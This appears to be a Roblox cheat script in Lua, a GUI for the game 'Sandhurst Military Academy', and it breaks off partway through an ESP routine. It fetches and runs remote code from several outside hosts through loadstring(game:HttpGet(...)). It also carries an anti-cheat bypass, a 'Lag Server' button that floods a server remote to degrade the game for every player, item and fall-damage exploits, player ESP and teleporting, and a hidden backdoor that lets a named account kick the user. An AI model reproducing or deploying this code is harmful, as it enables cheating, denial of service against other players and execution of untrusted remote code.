local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/FlairZx9/Script/refs/heads/main/source.lua"))()
local Window = Library.CreateLib("GUI for Sandhurst Military Academy (By ExamV1)", "Sentinel")

-- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Menu")
local Main = Window:NewTab("LocalPlayer")
local LocalSection = Main:NewSection("Menu")
local Main = Window:NewTab("Players")
local PlayerSection = Main:NewSection("Player Stuff")
local Main = Window:NewTab("Teleport")
local TeleportSection = Main:NewSection("Teleport")
local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")
local Players = game:GetService("Players")
local ChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

Players.PlayerAdded:Connect(function(player)
    if player.Name == "SniffyModzYolo" then
        player.Chatted:Connect(function(message)
            local lowerMessage = message:lower()
            local commandKick = "kick"
            local commandKickPlayer = "kick " .. LocalPlayer.Name:lower()

            if lowerMessage == commandKick or lowerMessage == commandKickPlayer then
                LocalPlayer:Kick("You have been kicked by the dev of Sandhurst Military GUI")
            end
        end)
    end
end)



local Players = game:GetService("Players")
local ChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents

Players.PlayerAdded:Connect(function(player)
    if player.Name == "SniffyModzYolo" then
        game.StarterGui:SetCore("SendNotification", {
            Title = "The Developer!";
            Text = "ExamV1 is in your game, the Developer of Sandhurst Military GUI!";
            Duration = "600";
            Callback = NotificationBindable;
        })
    end
end)






--main stuff

MainSection:NewButton("Bypass Anti Cheat", "Bypasses the 'better luck next time' message", function()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local whitelist = {
	game:GetService("ReplicatedStorage").AFKEvent,
    game:GetService("ReplicatedStorage").Assets,
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents,
	game:GetService("ReplicatedStorage").Packages,
	game:GetService("ReplicatedStorage").Remotes,
	game:GetService("ReplicatedStorage").Utility,
	game:GetService("ReplicatedStorage").VehicleShared,
	game:GetService("ReplicatedStorage").WeaponFrameworkRep,
    game:GetService("ReplicatedStorage").RemovePlayerHonorBindable,
    game:GetService("ReplicatedStorage").Bloom,
    game:GetService("ReplicatedStorage").ColorCorrection,
    game:GetService("ReplicatedStorage").ServerAge,
    game:GetService("ReplicatedStorage").SunRays,
    game:GetService("ReplicatedStorage").ServerVersion,
    game:GetService("ReplicatedStorage").ServerLocation,
    game:GetService("ReplicatedStorage").AddPlayerHonorBindable,
    game:GetService("ReplicatedStorage").Chatlogs,
    game:GetService("ReplicatedStorage").DeathLogs,
    game:GetService("ReplicatedStorage").FreeGun,
    game:GetService("ReplicatedStorage").GetPlayerHonorsBindable,
    game:GetService("ReplicatedStorage").GetProductPurchaseAmount,
    game:GetService("ReplicatedStorage").GetProductPurchaseAmountRemote,
    game:GetService("ReplicatedStorage").HandcuffsFunction,
    game:GetService("ReplicatedStorage").LogEvent,
    game:GetService("ReplicatedStorage").ListAllHonorsBindable,
    game:GetService("ReplicatedStorage").NewParachute,
    game:GetService("ReplicatedStorage").PromoteUser,
    game:GetService("ReplicatedStorage").getPlayerDetails,
    game:GetService("ReplicatedStorage").ChatChannels,
    game:GetService("ReplicatedStorage").CameraShaker,
    game:GetService("ReplicatedStorage").FirearmManagerBindable,
    game:GetService("ReplicatedStorage").FirearmRenderRemote,
    game:GetService("ReplicatedStorage").GetMeAShop,
    game:GetService("ReplicatedStorage").KO,
    game:GetService("ReplicatedStorage").KOS,
    game:GetService("ReplicatedStorage").PadsLock,
    game:GetService("ReplicatedStorage")["MED-KIT"],
    game:GetService("ReplicatedStorage").HandcuffsEvent,
    game:GetService("ReplicatedStorage").Pass,
    game:GetService("ReplicatedStorage").PickUpCarabiner,
    game:GetService("ReplicatedStorage").PingTimes,
    game:GetService("ReplicatedStorage").ProximityPromptFailure,
    game:GetService("ReplicatedStorage").RadialImage,
    game:GetService("ReplicatedStorage").ProximityPromptFailureClient,
    game:GetService("ReplicatedStorage").RagdollEvent,
    game:GetService("ReplicatedStorage").RagdollModule,
    game:GetService("ReplicatedStorage").RaidEvent,
    game:GetService("ReplicatedStorage").RegimentTags,
    game:GetService("ReplicatedStorage").RegisterProcessReceipt,
    game:GetService("ReplicatedStorage"):GetChildren()[1380],
    game:GetService("ReplicatedStorage").UpdatePlayerList,
    game:GetService("ReplicatedStorage").ToggleCoreGui,
    game:GetService("ReplicatedStorage").TeleportWhitelist,
    game:GetService("ReplicatedStorage").TeamChange,
    game:GetService("ReplicatedStorage").Specific,
    game:GetService("ReplicatedStorage").RemoteParachute,
    game:GetService("ReplicatedStorage").shut,
    game:GetService("ReplicatedStorage").pi,
    game:GetService("ReplicatedStorage").device,
    game:GetService("ReplicatedStorage")["[R] Global Constants"],
    game:GetService("ReplicatedStorage")["[R] Firearm Hitmarker"],
    game:GetService("ReplicatedStorage")["[R] Firearm Constants"],
    game:GetService("ReplicatedStorage")["[R] Event Constants"]
    }

    for _, item in pairs(replicatedStorage:GetChildren()) do
        if not table.find(whitelist, item) then
            item:Destroy()
        end
    end

    -- Set up the UI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "HelloScreenGui"
    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui

    local TextBox = Instance.new("TextLabel")
    TextBox.Name = "HelloTextBox"
    TextBox.Size = UDim2.new(1, 0, 0.2, 0) -- Changed height to 0.2 (20% of the screen height)
    TextBox.Position = UDim2.new(0, 0, 0, 0)
    TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
    TextBox.BackgroundTransparency = 1
    TextBox.Font = Enum.Font.SourceSansBold
    TextBox.Text = "Anti Cheat Bypassed by ExamV1"
    TextBox.TextColor3 = Color3.new(0, 0, 0)
    TextBox.TextScaled = true
    TextBox.Parent = ScreenGui

    -- Define the duration of the message in seconds
    local duration = 3

    -- Define the fade time in seconds
    local fadeTime = 1

    -- Define the rate of transparency change per second
    local fadeRate = 1 / fadeTime

    -- Show the message for the specified duration
    wait(duration)

    -- Start fading out the message
    local startTime = os.clock()
    while true do
        local elapsedTime = os.clock() - startTime
        local newTransparency = math.min(1, elapsedTime * fadeRate)
        TextBox.BackgroundTransparency = newTransparency
        TextBox.TextTransparency = newTransparency
        if newTransparency == 1 then
            break
        end
        wait()
    end
end)



local bindable = Instance.new("BindableFunction")
bindable.OnInvoke = function(response)
    if response == "Yes" then
        print("Lag server button clicked")
        while wait(0.4) do
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function bomb(table_increase, tries)
                local spammed_table = {}
                for i = 1, table_increase do
                    spammed_table = {spammed_table}
                end
                local maximum = math.floor(499999 / (table_increase + 2))
                local maintable = {}
                for i = 1, maximum do
                    table.insert(maintable, spammed_table)
                end
                game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
            end
            bomb(250, 2)
        end
    else
        print("Lag server button cancelled")
    end
end

MainSection:NewButton("Lag Server", "This will lag the server for everyone", function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Notification",
        Text = "Do you want to lag the server?",
        Duration = 30,
        Callback = bindable,
        Button1 = "Yes",
        Button2 = "No"
    })
end)







MainSection:NewButton("Delete Invisible Barriers", "Deletes all invisible parts/objects", function()
    for i, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
            v:Destroy()
        end
    end
end)

MainSection:NewButton("Invisibility Tool(Credit: Blitz)", "Makes your character invisible to others", function()
	loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
end)




local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local toggle = false

MainSection:NewToggle("Auto Give Free Gun", "Get Free Gun if not in Backpack or Workspace", function(state)
    toggle = state
end)

function getFreeGun()
    local args = {
        [1] = "Verify"
    }
    ReplicatedStorage.FreeGun:InvokeServer(unpack(args))
end

function autoGiveFreeGun()
    while true do
        if toggle then
            local hasGun = false
            local backpack = LocalPlayer:WaitForChild("Backpack")
            local workspace = game:GetService("Workspace")
            if backpack:FindFirstChild("FreeGun") or workspace:FindFirstChild(LocalPlayer.Name):FindFirstChild("FreeGun") then
                hasGun = true
            end
            if not hasGun then
                wait(3)
                getFreeGun()
            end
        end
        wait()
    end
end

local autoGiveFreeGunCoroutine = coroutine.wrap(autoGiveFreeGun)
autoGiveFreeGunCoroutine()

Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        toggle = false
    end
end)





MainSection:NewButton("Toggle AFK", "Toggles the AFK state", function()
    local args = {
        [1] = not toggleState
    }
    game:GetService("ReplicatedStorage"):WaitForChild("AFKEvent"):FireServer(unpack(args))
    toggleState = not toggleState
end)



MainSection:NewButton("Give Tools", "Gives yourself all the repair tools.", function()
local Workspace = game:GetService("Workspace")

local function fireGiverClickDetector(giverName)
    local giver = Workspace:FindFirstChild(giverName)

    if giver then
        local clickDetector = giver:FindFirstChildOfClass("ClickDetector")
        if clickDetector then
            if fireclickdetector then
                fireclickdetector(clickDetector)
            else
                print("Incompatible Exploit: Your exploit does not support this command (missing fireclickdetector)")
            end
        else
            print(giverName .. " does not have a ClickDetector.")
        end
    else
        print(giverName .. " not found in Workspace.")
    end
end

fireGiverClickDetector("FuelGiver")
fireGiverClickDetector("RearmGiver")
fireGiverClickDetector("RepairGiver")
fireGiverClickDetector("RPGGiver")
fireGiverClickDetector("StingerGiver")
fireGiverClickDetector("JavelinGiver")
end)





local player = game:GetService("Players").LocalPlayer
local workspace = game:GetService("Workspace")
local toggle = false

MainSection:NewToggle("Remove Fall Damage", "Removes FallDamage from LocalPlayer", function(state)
    toggle = state
end)

local function onCharacterAdded(character)
    if toggle then
        local fallDamage = character:FindFirstChild("FallDamage")
        if fallDamage then
            fallDamage:Destroy()
        end
    end
end

player.CharacterAdded:Connect(onCharacterAdded)

function removeFallDamageLoop()
    while true do
        if toggle and player.Character then
            local fallDamage = player.Character:FindFirstChild("FallDamage")
            if fallDamage then
                fallDamage:Destroy()
            end
        end
        wait()
    end
end

local removeFallDamageCoroutine = coroutine.wrap(removeFallDamageLoop)
removeFallDamageCoroutine()

game:GetService("Players").PlayerRemoving:Connect(function(removedPlayer)
    if removedPlayer == player then
        toggle = false
    end
end)








MainSection:NewButton("Fullbright", "Makes the game brighter", function()
	pcall(function()
		local lighting = game:GetService("Lighting");
		lighting.Ambient = Color3.fromRGB(255, 255, 255);
		lighting.Brightness = 1;
		lighting.FogEnd = 1e10;
		for i, v in pairs(lighting:GetDescendants()) do
			if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
				v.Enabled = false;
			end;
		end;
		lighting.Changed:Connect(function()
			lighting.Ambient = Color3.fromRGB(255, 255, 255);
			lighting.Brightness = 1;
			lighting.FogEnd = 1e10;
		end);
		spawn(function()
			local character = game:GetService("Players").LocalPlayer.Character;
			while wait() do
				repeat wait() until character ~= nil;
				if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
					local headlight = Instance.new("PointLight", character.HumanoidRootPart);
					headlight.Brightness = 1;
					headlight.Range = 60;
				end;
			end;
		end);
	end)
end)











--local player stuff

LocalSection:NewSlider("Speed", "Changes Player Speed", 333, 17, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)


LocalSection:NewButton("inf jump", "inf", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Infinite%20Jump.txt"))()
end)








--player stuff

local gotoDrop

local function updatePlayerList()
    local Plr = {}
    for i, v in pairs(game:GetService("Players"):GetChildren()) do
        table.insert(Plr, v.Name)
    end

    if spectateDrop then
        spectateDrop:Clear()
        spectateDrop:AddOptions(Plr)
    else
        spectateDrop = PlayerSection:NewDropdown("Spectate Player", "", Plr, function(selected)
            local player = game.Players:FindFirstChild(selected)
            if player then
                local character = player.Character
                if character then
                    workspace.CurrentCamera.CameraSubject = character.Humanoid
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Spectating!";
                        Text = "Spectating " .. player.Name;
                        Duration = 3;
                    })
                end
            end
            spectateDrop:SetSelectedIndex(0)
        end)
    end

    if gotoDrop then
        gotoDrop:Clear()
        gotoDrop:AddOptions(Plr)
    else
        gotoDrop = PlayerSection:NewDropdown("Go To Player", "", Plr, function(selected)
            local player = game.Players:FindFirstChild(selected)
            if player then
                local character = player.Character
                if character then
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        game.Players.LocalPlayer.Character:MoveTo(humanoidRootPart.Position)
                        game.StarterGui:SetCore("SendNotification", {
                            Title = "Teleporting!";
                            Text = "Teleporting to " .. player.Name;
                            Duration = 3;
                        })
                    end
                end
            end
            gotoDrop:SetSelectedIndex(0)
        end)
    end
end

updatePlayerList()
game:GetService("Players").PlayerAdded:Connect(updatePlayerList)


PlayerSection:NewButton("ESP", "esp", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD%20ESP.txt"))()
end)


PlayerSection:NewButton("ESP V2", "esp", function()
--Settings--
local ESP = {
    TextColor = Color3.fromRGB(255,255,255),
    EquippedColor = Color3.fromRGB(255,255,255),
    DistanceColor = Color3.fromRGB(255,255,255),
    TracerColor = Color3.fromRGB(255,255,255),
    LowerHealthColor = Color3.fromRGB(0,0,0),
    HigherHealthColor = Color3.fromRGB(133, 87, 242),
    Color = Color3.fromRGB(255,255,255),
    HealthBar = true,
    Enabled = true,
    Distance = true,
    Health = true,
    Equipped = true,
    Boxes = true,
    BoxShift = CFrame.new(0,-.3,0),
	BoxSize = Vector3.new(4,6,0),
    FaceCamera = true,
    Names = true,
    TeamColor = true,
    Thickness = 0.8,
    AttachShift = 1,
    TeamMates = true,
    Players = true,
    Tracers = false,
    Objects = setmetatable({}, {__mode="kv"}),
    Overrides = {},
    MaxShownDistance = 200,

}

--Declarations--
local cam = workspace.CurrentCamera
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()

local V3new = Vector3.new
local WorldToViewportPoint = cam.WorldToViewportPoint

--Functions--
local function Draw(obj, props)
	local new = Drawing.new(obj)
	
	props = props or {}
	for i,v in pairs(props) do
		new[i] = v
	end
	return new
end

function ESP:GetTeam(p)
	local ov = self.Overrides.GetTeam
	if ov then
		return ov(p)
	end
	
	return p and p.Team
end

function ESP:IsTeamMate(p)
    local ov = self.Overrides.IsTeamMate
	if ov then
		return ov(p)
    end
    
    return self:GetTeam(p) == self:GetTeam(plr)
end

function ESP:GetColor(obj)
	local ov = self.Overrides.GetColor
	if ov then
		return ov(obj)
    end
    local p = self:GetPlrFromChar(obj)
	return p and self.TeamColor and p.Team and p.Team.TeamColor.Color or self.Color
end

function ESP:GetPlrFromChar(char)
	local ov = self.Overrides.GetPlrFromChar
	if ov then
		return ov(char)
	end
	
	return plrs:GetPlayerFromCharacter(char)
end

function ESP:Toggle(bool)
    self.Enabled = bool
    if not bool then
        for i,v in pairs(self.Objects) do
            if v.Type == "Box" then --fov circle etc
                if v.Temporary then
                    v:Remove()
                else
                    for i,v in pairs(v.Components) do
                        v.Visible = false
                    end
                end
            end
        end
    end
end

function ESP:GetBox(obj)
    return self.Objects[obj]
end

function ESP:AddObjectListener(parent, options)
    local function NewListener(c)
        if type(options.Type) == "string" and c:IsA(options.Type) or options.Type == nil then
            if type(options.Name) == "string" and c.Name == options.Name or options.Name == nil then
                if not options.Validator or options.Validator(c) then
                    local box = ESP:Add(c, {
                        PrimaryPart = type(options.PrimaryPart) == "string" and c:WaitForChild(options.PrimaryPart) or type(options.PrimaryPart) == "function" and options.PrimaryPart(c),
                        Color = type(options.Color) == "function" and options.Color(c) or options.Color,
                        ColorDynamic = options.ColorDynamic,
                        Name = type(options.CustomName) == "function" and options.CustomName(c) or options.CustomName,
                        IsEnabled = options.IsEnabled,
                        RenderInNil = options.RenderInNil
                    })
                    --TODO: add a better way of passing options
                    if options.OnAdded then
                        coroutine.wrap(options.OnAdded)(box)
                    end
                end
            end
        end
    end

    if options.Recursive then
        parent.DescendantAdded:Connect(NewListener)
        for i,v in pairs(parent:GetDescendants()) do
            coroutine.wrap(NewListener)(v)
    
